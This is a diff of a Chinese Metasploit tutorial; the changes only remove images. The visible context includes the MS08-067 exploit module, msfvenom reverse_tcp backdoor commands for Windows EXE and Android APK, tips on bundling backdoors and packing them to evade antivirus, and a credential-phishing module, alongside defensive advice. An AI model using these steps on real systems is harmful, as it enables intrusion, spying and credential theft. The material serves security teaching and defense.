@@ -43,7 +43,6 @@ MS08-067 是一个针对 Windows 系统 SMB 服务（端口 445）的经典漏�
     use exploit/windows/smb/ms08_067_netapi
     ```
 
-![](img/9585925a3c137222837176a8f2ca0ba5_16.png)
 
 2.  **查看并设置模块参数**：
     ```bash
@@ -70,13 +69,11 @@ MS08-067 是一个针对 Windows 系统 SMB 服务（端口 445）的经典漏�
     *   `screenshot`：截取目标桌面屏幕。
     *   `webcam_snap`：尝试开启摄像头拍照（需注意虚拟机需开启 USB 服务）。
 
-![](img/9585925a3c137222837176a8f2ca0ba5_22.png)
 
 ![](img/9585925a3c137222837176a8f2ca0ba5_24.png)
 
 ### PC 端后门程序 (EXE) 的生成与捆绑
 
-![](img/9585925a3c137222837176a8f2ca0ba5_26.png)
 
 ![](img/9585925a3c137222837176a8f2ca0ba5_28.png)
 
@@ -98,9 +95,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f ex
 *   **捆绑程序**：将后门与正常程序（如扫雷游戏）捆绑在一起，用户运行正常程序时，后门也在后台悄悄运行。
 *   **加壳保护**：使用加壳工具对生成的程序进行加密或混淆，以绕过杀毒软件的特征码检测。
 
-![](img/9585925a3c137222837176a8f2ca0ba5_32.png)
 
-![](img/9585925a3c137222837176a8f2ca0ba5_33.png)
 
 ![](img/9585925a3c137222837176a8f2ca0ba5_35.png)
 
@@ -116,11 +111,9 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f ex
 
 ![](img/9585925a3c137222837176a8f2ca0ba5_43.png)
 
-![](img/9585925a3c137222837176a8f2ca0ba5_45.png)
 
 了解了攻击方法，我们来看看如何防御。
 
-![](img/9585925a3c137222837176a8f2ca0ba5_47.png)
 
 ![](img/9585925a3c137222837176a8f2ca0ba5_49.png)
 
@@ -132,7 +125,6 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f ex
 2.  **启用实时保护**：
     确保 Windows Defender 或第三方杀毒软件的“实时保护”功能处于开启状态，它能阻止大部分已知恶意程序的运行。
 
-![](img/9585925a3c137222837176a8f2ca0ba5_53.png)
 
 3.  **谨慎运行程序**：
     *   不要轻易运行来源不明的 `.exe` 文件。
@@ -141,9 +133,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f ex
 
 ![](img/9585925a3c137222837176a8f2ca0ba5_55.png)
 
-![](img/9585925a3c137222837176a8f2ca0ba5_56.png)
 
-![](img/9585925a3c137222837176a8f2ca0ba5_58.png)
 
 4.  **注意文件后缀名欺骗**：
     攻击者可能利用特殊字符（如 Unicode 控制字符）将 `evil.exe` 伪装成 `picture.jpg.exe`，在默认不显示后缀名的系统中，它看起来就像一个图片文件。请务必在文件夹选项中设置“显示文件扩展名”。
@@ -156,9 +146,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f ex
 
 ![](img/9585925a3c137222837176a8f2ca0ba5_64.png)
 
-![](img/9585925a3c137222837176a8f2ca0ba5_65.png)
 
-![](img/9585925a3c137222837176a8f2ca0ba5_66.png)
 
 ## 第二部分：内网渗透与 ARP 攻击防御
 
@@ -191,7 +179,6 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f ex
 
 ![](img/9585925a3c137222837176a8f2ca0ba5_79.png)
 
-![](img/9585925a3c137222837176a8f2ca0ba5_81.png)
 
 ### 内网防御思路
 
@@ -204,7 +191,6 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f ex
 
 ![](img/9585925a3c137222837176a8f2ca0ba5_85.png)
 
-![](img/9585925a3c137222837176a8f2ca0ba5_87.png)
 
 ---
 
@@ -218,7 +204,6 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f ex
 
 上一节我们讨论了内网中的威胁，本节中我们来看看一种常见的网络欺诈手段——钓鱼网站。
 
-![](img/9585925a3c137222837176a8f2ca0ba5_95.png)
 
 ![](img/9585925a3c137222837176a8f2ca0ba5_96.png)
 
@@ -226,7 +211,6 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f ex
 
 ![](img/9585925a3c137222837176a8f2ca0ba5_98.png)
 
-![](img/9585925a3c137222837176a8f2ca0ba5_100.png)
 
 ![](img/9585925a3c137222837176a8f2ca0ba5_101.png)
 
@@ -234,7 +218,6 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f ex
 
 ![](img/9585925a3c137222837176a8f2ca0ba5_103.png)
 
-![](img/9585925a3c137222837176a8f2ca0ba5_105.png)
 
 **利用 MSF 搭建简单钓鱼页面**：
 ```bash
@@ -246,7 +229,6 @@ run
 ```
 运行后，会生成一个假冒的 HTTP 基础认证登录框。当用户输入信息后，凭证会被 MSF 捕获。
 
-![](img/9585925a3c137222837176a8f2ca0ba5_107.png)
 
 ![](img/9585925a3c137222837176a8f2ca0ba5_108.png)
 
@@ -268,7 +250,6 @@ run
 
 原理与 PC 端的 EXE 后门类似，只是平台不同。
 
-![](img/9585925a3c137222837176a8f2ca0ba5_110.png)
 
 **生成后门 APK**：
 ```bash
@@ -280,17 +261,14 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=5555 R > m
 *   **重新签名**：为 APK 重新签名，使其看起来像是一个正常的应用。
 *   **捆绑**：将后门代码植入到正常的 APK 应用中（技术难度较高）。
 
-![](img/9585925a3c137222837176a8f2ca0ba5_112.png)
 
 ### 移动端防御思路
 
-![](img/9585925a3c137222837176a8f2ca0ba5_114.png)
 
 ![](img/9585925a3c137222837176a8f2ca0ba5_116.png)
 
 ![](img/9585925a3c137222837176a8f2ca0ba5_118.png)
 
-![](img/9585925a3c137222837176a8f2ca0ba5_120.png)
 
 1.  **谨慎安装应用**：仅从官方应用商店（如 Google Play、华为应用市场、小米应用商店等）下载安装应用。
 2.  **注意权限申请**：安装或运行应用时，仔细审查其申请的权限。一个手电筒应用请求读取通讯录和短信权限是极不正常的。
@@ -298,13 +276,10 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=5555 R > m
 4.  **保持系统更新**：及时更新手机操作系统和安全补丁。
 5.  **安装安全软件**：在移动设备上安装可靠的安全软件。
 
-![](img/9585925a3c137222837176a8f2ca0ba5_122.png)
 
 ---
 
-![](img/9585925a3c137222837176a8f2ca0ba5_124.png)
 
-![](img/9585925a3c137222837176a8f2ca0ba5_126.png)
 
 ## 总结与展望：物联网安全
 
